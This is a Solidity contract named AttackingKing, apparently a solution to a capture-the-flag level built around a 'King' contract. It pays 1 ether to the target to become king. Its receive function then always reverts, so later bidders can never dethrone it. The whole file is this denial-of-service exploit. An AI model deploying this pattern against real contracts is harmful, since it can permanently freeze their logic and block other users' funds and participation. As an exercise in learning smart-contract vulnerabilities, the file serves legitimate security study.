// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        // become king by sending some money to become king
        payable(contractAddress).call{value: 1 ether}("");
    }

    receive() external payable {
        // once we become king, we error out on receival
        require(false, "block others");
    }
}
